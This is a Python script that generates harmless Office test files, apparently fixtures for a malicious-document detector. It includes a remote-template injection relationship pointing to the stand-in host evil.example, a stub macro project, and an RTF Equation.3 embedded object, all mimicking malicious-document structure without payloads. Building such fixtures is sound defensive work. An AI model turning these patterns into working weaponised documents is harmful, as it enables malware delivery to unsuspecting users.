"""Creates small, harmless Office-style test files in the dfa_test folder of your temp directory.

They only contain the *structure* a malicious file would have (a macro part, a remote
template link...). There is no real macro or exploit inside, and nothing is executed.

Usage (from the project root):
    python scripts/make_test_docs.py
"""
import tempfile
import zipfile
from pathlib import Path

OUT = Path(tempfile.gettempdir()) / "dfa_test"
OUT.mkdir(parents=True, exist_ok=True)

REMOTE_TEMPLATE = (
    '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/'
    '2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" '
    'TargetMode="External"/></Relationships>')


def ooxml(name, extra=None):
    files = {"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>"}
    files.update(extra or {})
    with zipfile.ZipFile(OUT / name, "w", zipfile.ZIP_DEFLATED) as z:
        for n, c in files.items():
            z.writestr(n, c)


ooxml("clean.docx")
ooxml("template.docx", {"word/_rels/settings.xml.rels": REMOTE_TEMPLATE})
ooxml("macro.docm", {"word/vbaProject.bin": b"\x00\x00 not a real macro \x00"})

ole_magic = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
(OUT / "old.doc").write_bytes(
    ole_magic + b"\x00" * 100 + "WordDocument".encode("utf-16-le") + "_VBA_PROJECT".encode("utf-16-le"))

(OUT / "object.rtf").write_bytes(rb"{\rtf1{\object\objemb{\*\objclass Equation.3}{\*\objdata 0102}}}")

print("Created in", OUT)
for p in sorted(OUT.glob("*")):
    print("  ", p.name)